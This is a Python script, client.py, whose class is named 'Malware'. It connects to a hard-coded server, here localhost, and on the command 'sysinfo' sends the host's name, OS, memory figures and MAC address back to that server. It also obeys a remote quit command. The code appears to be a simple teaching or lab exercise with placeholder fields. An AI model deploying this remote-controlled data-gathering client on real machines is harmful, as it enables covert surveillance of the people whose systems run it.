# client.py client

import socket
from time import ctime
import select
import sys
import platform
import subprocess
import psutil
import re
import uuid
import os
import time
import locale

class Malware:
    def __init__(self):
        self.HOST = 'localhost'
        self.PORT = 12346
        self.MESSAGE_LENGTH_SIZE = 64
        self.ENCODING = 'utf-8'
        self.ADDR = (self.HOST, self.PORT)
        self.BUFSIZE = 1024
        self.system_info = {}

    def send_message(self, client, msg):
        message = msg.encode(self.ENCODING)
        msg_length = len(message)
        msg_length = str(msg_length).encode(self.ENCODING)
        msg_length += b' ' * (self.MESSAGE_LENGTH_SIZE - len(msg_length))
        client.send(msg_length)
        client.send(message)

    def get_system_info(self):
        self.system_info['Host Name'] = socket.gethostname()
        self.system_info['OS Name'] = platform.system()
        self.system_info['OS Version'] = platform.release()
        self.system_info['OS Manufacturer'] = '?'
        self.system_info['OS Configuration'] = platform.machine()
        self.system_info['Registered Owner'] = '?'
        self.system_info['Registered Organization'] = '?'
        self.system_info['Product ID'] = '?'
        self.system_info['Original Install Date'] = '?'
        self.system_info['System Boot Time'] = str(psutil.boot_time()) + 's'
        self.system_info['System Manufacturer'] = '?'
        self.system_info['System Model'] = '?'
        self.system_info['System Type'] = '?'
        self.system_info['Processor(s)'] = platform.processor()
        self.system_info['BIOS Version'] = '?'
        self.system_info['Windows Directory'] = '?'
        self.system_info['System Directory'] = '?'
        self.system_info['Boot Device'] = '?'
        self.system_info['System Locale'] = '{}({})'.format(locale.getdefaultlocale()[0], locale.getdefaultlocale()[1])
        self.system_info['Input Locale'] = '?'
        self.system_info['Time Zone'] = time.tzname[0]
        self.system_info['Total Physical Memory'] = '?'
        self.system_info['Available Physical Memory'] = '?'
        self.system_info['Virtual Memory: Max Size'] = str(
            round(psutil.virtual_memory().total / (1024.0 ** 3), 4)) + " GB"
        self.system_info['Virtual Memory: Available'] = str(
            round(psutil.virtual_memory().available / (1024.0 ** 3), 4)) + " GB"
        self.system_info['Virtual Memory: In Use'] = str(
            round(psutil.virtual_memory().total / (1024.0 ** 3), 4) -
            round(psutil.virtual_memory().available / (1024.0 ** 3), 4)
        ) + " GB"
        self.system_info['Page File Location(s)'] = '?'
        self.system_info['Domain'] = '?'
        self.system_info['Logon Server'] = '?'
        self.system_info['Hotfix(s)'] = '?'

        self.system_info['OS Architecture'] = platform.machine()
        self.system_info['Mac Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.system_info['RAM'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"

    def stringify_system_info(self):
        res = '\n-------\n'
        for info in self.system_info.keys():
            res += '{}: {}\n'.format(info, self.system_info[info])
        return res

    def main(self):
        tcpClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcpClient.connect(self.ADDR)
        gets = [tcpClient, sys.stdin]
        while True:
            try:
                readyInput, readyOutput, readyException = select.select(gets, [], [])
                for indata in readyInput:
                    if indata == tcpClient:
                        # data = tcpClient.recv(self.BUFSIZE)
                        message_length = int(tcpClient.recv(self.MESSAGE_LENGTH_SIZE).decode(self.ENCODING))
                        data = tcpClient.recv(message_length).decode(self.ENCODING)
                        if not data:
                            break
                        if data.lower() == 'sysinfo':
                            print('{}\t[SENDING DATA TO SERVER]'.format(ctime()))
                            self.get_system_info()
                            self.send_message(tcpClient, self.stringify_system_info())
                        elif data.lower() == '-q':
                            print('{}\t[TERMINATING MALWARE]'.format(ctime()))
                            sys.exit()
                    else:
                        data = input()
                        if not data:
                            break
                        # tcpClient.send(bytes(data, 'utf-8'))
                        self.send_message(tcpClient, data)
            except ValueError:
                print('connection lost')

if __name__ == '__main__':
    malware = Malware()
    malware.main()